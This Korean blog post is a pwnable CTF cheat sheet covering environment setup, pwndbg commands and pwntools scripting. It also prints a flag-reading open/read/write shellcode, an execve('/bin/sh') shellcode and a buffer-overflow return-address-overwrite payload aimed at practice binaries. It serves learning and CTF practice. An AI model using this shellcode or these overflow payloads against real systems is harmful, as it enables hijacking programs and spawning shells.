---
layout: post
title: Pwn Basic
subtitle: Pwnable 세팅 및 Pwngdb 단축키
author: g3rm
categories: 
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - Pwnable
  - Settings
  - Pwngdb
  - Little_Endian
  - Exploit
sidebar:
---

## Setting
```shell
Ubuntu 22.04
CTF용 우분투 세팅 (wsl)

sudo apt update -y
sudo apt install netcat vim git gcc ssh curl wget gdb sudo python3 python3-pip -y
sudo apt install libffi-dev build-essential libssl-dev libc6-i386 libc6-dbg gcc-multilib make tmux xterm -y
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install libc6:i386 -y
python3 -m pip install --upgrade pip
pip3 install unicorn keystone-engine pwntools ropgadget
sudo apt install libcapstone-dev -y
cd ~
# git clone https://github.com/longld/peda.git ~/peda
# echo "source ~/peda/peda.py" >> ~/.gdbinit
# git clone https://github.com/scwuaptx/Pwngdb.git
# cp ~/Pwngdb/.gdbinit ~/
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
sudo apt install ruby-full -y
sudo gem install one_gadget seccomp-tools
```

## Pwngdb
```shell
# Entry point address:               0x10c0
readelf -h stack

# gdb 실행
cd "/mnt/c/wsl2/stack"
gdb stack

# 보호 기법 확인
pwngdb> checksec

# 함수 주소 찾기
pwngdb> print <function_name>

# b breakpoint / c continue / r run / si step into / ni next instruction / i info / k kill/ pd pdisas
pwngdb> entry
pwngdb> b *main
pwngdb> c

# 어떤 함수의 내부까지 궁금할 때는 si를, 그렇지 않을 때는 ni
# next instruction
pwngdb> ni
pwngdb> si

# si 로 들어갔을 때 해당 함수 한번에 실행하여 나오기
pwngdb> finish

# disassembly
pwngdb> disassemble main
## 가독성 좋게 메모리 구조 표현해줌
pwngdb> u

# rsp 부터 80바이트를 8바이트 씩 hex형식으로 출력
pwngdb> x/20gx $rsp

# rip부터 5줄의 어셈블리 명령어 출력
pwngdb> x/5i $rip

# 특정 주소의 문자열 출력
pwngdb> x/s 0x40000

# 재귀적으로 메모리가 참조하고 있는 주소 탐색
pwngdb> tele

# 파일이 매핑 된 영역일 경우 해당 파일의 경로까지 보여줌
pwngdb> vmmap

# 입력값 전달
pwndbg> r $(python3 -c "print('\xff' * 100)")
pwndbg> r $(python3 -c "print('\xff' * 100)") <<< $(python3 -c "print('dreamhack')")
```

## PwnTool
```Python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

# CTF 풀 때, 원격으로 붙기
p = remote("host3.dreamhack.games", 14855)

# 로컬 바이너리 실행 & 특정 lib 로드
elf = context.binary = ELF("./rao")
libc = ELF("./libc.so.6")
p = process(elf.path, env={"LD_PRELOAD":"./libc.so.6"})

# printf에 중요 정보가 있을 때
p.recvuntil(b"Printf() address : ")
printf_addr = int(p.recvline().strip(), 16)

# 해당 함수의 실 위치
libc.sym["printf"]

# 문자열 찾기
next(libc.search(b"/bin/sh"))

# 가젯 찾기
ROP(libc).find_gadget(["pop rdi", "ret"])[0]

# scanf로 받을 때
p.sendafter("Input: ", payload)

# payload
offset = 56
payload = b"A" * offset
payload += p64(get_shell_addr)

# 셸 획득
p.interactive()
```
## Exploit

### Util
#### Little Endian 변환 코드
```Python
import binascii

def hex_lsb(hex_val):
    hex_arr = []
    hex_str_lsb = ''.join([hex_val[i-2:i] for i in range(len(hex_val), 0, -2)])

    if len(hex_str_lsb)>16:
        for i in range(len(hex_str_lsb), 0, -16):
            chunk = hex_str_lsb[max(i-16, 0):i]
            hex_arr.append(f"0x{chunk}")
    else:
        hex_arr.append(hex_str_lsb)

    return hex_arr[::-1]

hex = b"/tmp/flag"
hex = str(binascii.hexlify(hex))
hex = hex[2:len(hex)-1]

print(hex_lsb(hex))
```

### Shellcode
> [shellcode database](https://shell-storm.org/shellcode/index.html)참고

어셈블리어로 쉘코드를 작성할 수 있어야 추후 원하는 동작으로 이끌어내는 데 도움이 될테니 알아두자.
#### orw shellcode
파일을 열고 읽고 출력해주는 쉘코드로 아래 함수 정보를 이용하여 작성하면 된다.

| **syscall** | **rax** | **arg0 (rdi)**       | **arg1 (rsi)**  | **arg2 (rdx)** |
| ----------- | ------- | -------------------- | --------------- | -------------- |
| read        | 0x00    | unsigned int fd      | char *buf       | size_t count   |
| write       | 0x01    | unsigned int fd      | const char *buf | size_t count   |
| open        | 0x02    | const char *filename | int flags       | umode_t mode   |

```assembly
push 0x0
mov rax, 0x676e6f6f6f6f6f6f 
push rax
mov rax, 0x6c5f73695f656d61 
push rax
mov rax, 0x6e5f67616c662f63 
push rax
mov rax, 0x697361625f6c6c65 
push rax
mov rax, 0x68732f656d6f682f 
push rax

mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

#### execve shellcode
쉘을 얻는 코드로 일반적으로 쉘코드라 하면 해당 방법을 의미함.

| **syscall** | **rax** | **arg0 (rdi)**       | **arg1 (rsi)**          | **arg2 (rdx)**          |
| ----------- | ------- | -------------------- | ----------------------- | ----------------------- |
| execve      | 0x3b    | const char *filename | const char *const *argv | const char *const *envp |
```assembly
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

#### skeleton code
```c
// File name: sh-skeleton.c
// Compile Option: gcc -o sh-skeleton sh-skeleton.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "Input your shellcode here.\n"
    "Each line of your shellcode should be\n"
    "seperated by '\n'\n"

    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");

void run_sh();

int main() { run_sh(); }
```

#### Extract Shellcode
```shell
objdump -d poc
objcopy -O binary --only-section=.text poc text.bin
xxd -i text.bin
```

### BOF
설정된 버퍼보다 더 많은 양의 데이터를 입력하여 해당 버퍼를 넘어 다른 데이터 영역까지 침범하는 취약점
1. 중요 데이터 변조 [다른 데이터 영역 침범]
2. 데이터 유출 [널 바이트 삭제]
3. 실행 흐름 조작 [RIP, 함수의 반환 주소 조작]

Ubuntu 20.04 버전 이상은 기본적으로 Segmentation fault라는 에러가 출력시 `/var/lib/apport/coredump`에 코어 파일을 생성하기에 해당 파일을 통해 디버깅 할 수 있다.
```shell
# 코어 파일이 생성되지 않을 때, 코어 파일 크기 제한 해제
ulimit -c unlimited

# 코어 파일 분석 법
gdb rao -c core.1828876
```

#### 위험 함수들
주로 BOF가 발생할 수 있는 함수들 정리

|**입력 함수(패턴)**|**위험도**|**평가 근거**|
|---|---|---|
|gets(buf)|매우 위험|- 입력받는 길이에 제한이 없음.<br>    <br>- 버퍼의 널 종결을 보장하지 않음: 입력의 끝에 널바이트를 삽입하므로, 버퍼를 꽉채우면 널바이트로 종결되지 않음. 이후 문자열 관련 함수를 사용할 때 버그가 발생하기 쉬움.|
|scanf(“%s”, buf)|매우 위험|- 입력받는 길이에 제한이 없음.<br>    <br>- 버퍼의 널 종결을 보장하지 않음: `gets`와 동일.|
|scanf(“%[width]s”, buf)|주의 필요|- width만큼만 입력받음: width를 설정할 때 `width <= size(buf) - 1`을 만족하지 않으면, 오버플로우가 발생할 수 있음.<br>    <br>- 버퍼의 널 종결을 보장하지 않음: `gets`와 동일.|
|fgets(buf, len, stream)|주의 필요|- len만큼만 입력받음: len을 설정할 때 `len <= size(buf)`을 만족하지 않으면, 오버플로우가 발생할 수 있음.<br>    <br>- 버퍼의 널 종결을 보장함.<br>    <br>    - len보다 적게 입력하면, 입력의 끝에 널바이트 삽입.<br>        <br>    - len만큼 입력하면, 입력의 마지막 바이트를 버리고 널바이트 삽입.<br>        <br>- **데이터 유실 주의**: 버퍼에 담아야 할 데이터가 30바이트인데, 버퍼의 크기와 len을 30으로 작성하면, 29바이트만 저장되고, 마지막 바이트는 유실됨|

#### Return Address Overwrite
buf 크기보다 더 데이터를 입력할 수 있다면, 아래 그림에 따르면 0x38만큼의 dummy data를 삽입 후 return address를 덮어 쓰면 된다.
![](/assets/images/posts/2025-04-28-PwnBasic/424b6399f7b838deb43d2a0ee9e32076_MD5.jpeg)
아래와 같은 방법으로 위 그림의 스택 구조를 가진 프로그램에서 exploit 할 수 있다.
```shell
(python -c "import sys;sys.stdout.buffer.write(b'A'*0x30 + b'B'*0x8 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')";cat)| ./rao
```

실제 Stack 상황을 보면 RSP에 입력 값["AAAAA"]
![](/assets/images/posts/2025-04-28-PwnBasic/4533aadf81dd602ef2abb689e410ff3e_MD5.jpeg)